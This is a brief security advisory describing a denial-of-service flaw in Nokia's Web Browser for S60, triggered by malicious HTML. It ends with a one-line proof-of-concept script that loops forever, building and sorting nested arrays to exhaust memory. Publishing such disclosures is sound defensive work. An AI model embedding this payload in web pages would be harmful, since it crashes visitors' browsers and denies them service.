Nokia Web Browser for S60 is prone to a denial-of-service vulnerability when handling malicious HTML files.

A successful exploit of this issue allows remote attackers to consume excessive system resources in the affected browser, which will cause the application to crash and deny service to legitimate users. Attackers may also be able to run arbitrary code, but this has not been confirmed.

<script> foo = new Array(); while(true) {foo = new Array(foo).sort();} </script>
